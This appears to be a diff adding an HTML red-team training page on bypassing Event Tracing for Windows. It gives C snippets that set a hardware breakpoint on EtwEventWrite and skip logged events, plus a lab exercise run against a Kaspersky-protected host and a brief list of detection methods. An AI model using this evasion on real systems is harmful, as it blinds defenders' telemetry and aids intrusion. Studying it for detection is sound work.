@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 12 — ETW Bypass | 22nd Survey Division</title>
+<style>
+  :root {
+    --bg: #0c0c0c;
+    --fg: #cccccc;
+    --green: #0f0;
+    --red: #f44;
+    --cyan: #0ff;
+    --magenta: #f0f;
+    --amber: #ffb000;
+    --dim: #666;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 14px;
+    line-height: 1.7;
+    padding: 20px;
+    min-height: 100vh;
+  }
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+  }
+  h1 {
+    color: var(--cyan);
+    font-size: 24px;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: var(--green);
+    font-size: 16px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin: 30px 0 15px;
+    border-left: 3px solid var(--green);
+    padding-left: 10px;
+  }
+  h3 {
+    color: var(--amber);
+    font-size: 14px;
+    margin: 20px 0 10px;
+  }
+  p {
+    margin-bottom: 15px;
+    color: var(--fg);
+  }
+  .widget-iframe {
+    width: 100%;
+    height: 600px;
+    border: 1px solid #333;
+    border-radius: 8px;
+    margin: 20px 0;
+    background: #111;
+  }
+  .note {
+    color: var(--magenta);
+    font-style: italic;
+    margin: 15px 0;
+    padding: 10px;
+    background: #1a1a1a;
+    border-left: 3px solid var(--magenta);
+  }
+  .warning {
+    color: var(--red);
+    border-left-color: var(--red);
+  }
+  code {
+    background: #1a1a1a;
+    color: var(--cyan);
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-size: 0.9em;
+  }
+  pre {
+    background: #0a0a0a;
+    border: 1px solid #222;
+    border-radius: 4px;
+    padding: 15px;
+    overflow-x: auto;
+    margin: 15px 0;
+  }
+  .nav {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 40px;
+    padding-top: 20px;
+    border-top: 1px solid #333;
+  }
+  .nav a {
+    color: var(--cyan);
+    text-decoration: none;
+  }
+  .nav a:hover {
+    text-decoration: underline;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Module 12 — ETW Bypass</h1>
+  <p><strong>First Principle:</strong> If you control the logger, you control what gets seen.</p>
+
+  <h2>Overview</h2>
+  <p>Event Tracing for Windows (ETW) is Microsoft's high-performance logging mechanism. It powers Windows Event Log, Sysmon, and most EDR telemetry. If you can silence ETW, you blind the defender.</p>
+  <p>The Dark Room technique uses hardware breakpoints (DR0/DR1) to intercept <code>EtwEventWrite</code> in ntdll.dll — zero memory writes, no hooks, no patches. Invisible to software scanners.</p>
+
+  <h2>Interactive Demo</h2>
+  <p>Real data from lab machines .92 (Intel, Kaspersky active) and .42 (AMD, clean sandbox):</p>
+  <iframe class="widget-iframe" src="../widgets/module_12_widget.html" title="Module 12 ETW Bypass Interactive Demo"></iframe>
+
+  <h2>Theory</h2>
+  <p>ETW providers register with the kernel. When an event fires, the kernel calls <code>EtwEventWrite</code> in ntdll.dll. This function marshals the event data and passes it to the kernel.</p>
+  <p>If we set a hardware breakpoint on <code>EtwEventWrite</code>, the CPU triggers a debug exception before the function executes. Our handler can redirect execution, skip the event, or modify the data.</p>
+
+  <h2>The Attack</h2>
+  <h3>Step 1: Find EtwEventWrite</h3>
+  <pre><code>// Get the address from ntdll.dll
+HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");</code></pre>
+
+  <h3>Step 2: Set Hardware Breakpoint</h3>
+  <pre><code>// Set DR0 to the target address
+CONTEXT ctx = {0};
+ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+ctx.Dr0 = (DWORD64)pEtwEventWrite;
+ctx.Dr7 = 0x101; // Local + global enable, exact match
+
+NtSetContextThread(hThread, &ctx);</code></pre>
+
+  <h3>Step 3: Handle the Exception</h3>
+  <pre><code>// In your VEH handler:
+if (ExceptionInfo->ExceptionRecord->ExceptionAddress == pEtwEventWrite) {
+    // Skip the event — just return success
+    ExceptionInfo->ContextRecord->Rip += 2; // Skip call instruction
+    return EXCEPTION_CONTINUE_EXECUTION;
+}</code></pre>
+
+  <div class="note warning">
+    <strong>CRITICAL:</strong> This technique requires no special privileges beyond the ability to debug your own process. On Windows, any process can set debug registers on its own threads. The breakpoint is hardware — it exists in the CPU, not in memory.
+  </div>
+
+  <h2>Detection</h2>
+  <p>Blue teams have limited options:</p>
+  <ul>
+    <li><strong>Hypervisor-based tracing:</strong> Intel PT or AMD IBS can record execution without relying on ETW. Expensive, complex.</li>
+    <li><strong>Kernel callbacks:</strong> Register for debug register access notifications. Rarely implemented.</li>
+    <li><strong>ETW session analysis:</strong> Look for gaps in event flow. Hard to distinguish from normal noise.</li>
+    <li><strong>Memory forensics:</strong> Check CONTEXT structures for Dr7 != 0. Volatile — gone on thread exit.</li>
+  </ul>
+
+  <h2>Lab Exercise</h2>
+  <p><strong>Objective:</strong> Implement your own ETW bypass and test it against Windows Event Log.</p>
+  <ol>
+    <li>Find <code>EtwEventWrite</code> in ntdll.dll on your target machine</li>
+    <li>Allocate a thread in your target process</li>
+    <li>Set <code>CONTEXT_DEBUG_REGISTERS</code> with <code>Dr0 = EtwEventWrite</code></li>
+    <li>Set <code>Dr7 = 0x101</code> (local + global enable)</li>
+    <li>Call <code>NtSetContextThread</code></li>
+    <li>Trigger an ETW event (e.g., PowerShell execution)</li>
+    <li>Verify: Event should NOT appear in Windows Event Log</li>
+    <li><strong>BONUS:</strong> Detect your own bypass using memory forensics</li>
+  </ol>
+
+  <div class="note">
+    <strong>Test Environment:</strong> Use .92 (Kaspersky active) or .42 (clean sandbox). Document what works and what doesn't. Real AV behavior differs from clean machines.
+  </div>
+
+  <div class="nav">
+    <a href="MODULE_11_AMSI.html">← Module 11: AMSI Bypass</a>
+    <a href="MODULE_13_KAV_EVASION.html">Module 13: Kaspersky Evasion →</a>
+  </div>
+</div>
+
+</body>
+</html>
